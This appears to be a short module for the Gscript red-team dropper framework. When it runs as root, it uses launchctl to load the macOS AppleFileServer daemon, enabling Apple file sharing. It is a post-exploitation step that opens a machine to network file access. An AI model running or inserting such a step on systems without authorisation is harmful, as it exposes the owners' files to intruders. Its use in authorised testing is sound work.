
// enable apple file shares
// Title: enable apple file shares
// Author: 
// Purpose: 
// Gscript version: 1.0.0
// Tactic: 
// ATT&CK: 

//priority:130
//timeout:130

//go_import:os/user as user
  
function Deploy() {  
    console.log("Enabling apple file shares");

    //Ensure running as root
    var curUser = user.Current();
    console.log("Our user is: "+curUser[0].Username);
    if (curUser[0].Username == "root") {
        var execResp = G.exec.ExecuteCommand("launchctl", ["load", "-w", "/System/Library/LaunchDaemons/com.apple.AppleFileServer.plist"]);
        console.log("Pid: "+execResp[0]);
        console.log("stdout: "+execResp[1])
        console.log("stderr: "+execResp[2])
        console.log("exit code: "+execResp[3])
        if (execResp[4] != null) {
            console.log("go errors: "+execResp[4].Errors());  
        }        
    } else {
        console.log("Not running as root!");
    }

    console.log("Enabling apple file shares");
    return true;
  }



